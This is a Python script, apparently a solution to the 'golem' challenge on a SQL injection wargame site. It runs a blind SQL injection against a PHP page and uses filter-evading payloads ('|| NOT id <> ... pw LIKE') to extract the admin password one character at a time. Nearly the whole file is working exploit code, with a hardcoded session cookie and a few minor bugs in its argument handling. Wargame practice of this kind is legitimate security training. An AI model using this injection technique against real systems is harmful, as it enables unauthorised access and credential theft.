#!/bin/python3
import sys
import time
from concurrent.futures.thread import ThreadPoolExecutor
from webbrowser import get

import requests
import itertools as it

st = time.time()
pwLength = 8
if len(sys.argv) == 2:
    url = sys.argv[1]
    php_cookie = sys.argv[2]
else:
    url = "https://los.rubiya.kr/chall/golem_4b5202cfedd8160e73124b5234235ef5.php"
    php_cookie = "gsvi1j3k3nb6n4oivqee872qnd"


def getPwLength():
    for l in range(1, 20):
        if is_correct("' || NOT id <> 'admin' && NOT length(pw) <> {} || '' <> '".format(l)):
            return l
    return -1


def is_correct(pw):
    r = requests.get(url,
                     params={"pw": pw},
                     cookies={"PHPSESSID": php_cookie})
    return "<h2>" in r.content.decode("UTF-8")


def check_next_char(c):
    fmt = '{}{}%'.format(pw, chr(c))
    return is_correct("' || NOT id <> 'admin' && pw LIKE '{}".format(fmt))


pwLength = 8
if pwLength == -1:
    pwLength = getPwLength()

if pwLength == -1:
    print('could not find pw length')
    exit(1)

print('password length is', pwLength)
pw = ''

for l in range(1, pwLength+1):
    for c in it.chain(range(ord('0'), ord('9') + 1), range(ord('a'), ord('z') + 1)):
        if check_next_char(c):
            pw += chr(c)
            break

print('the password is ', pw)
print("time to finish: ", time.time() - st)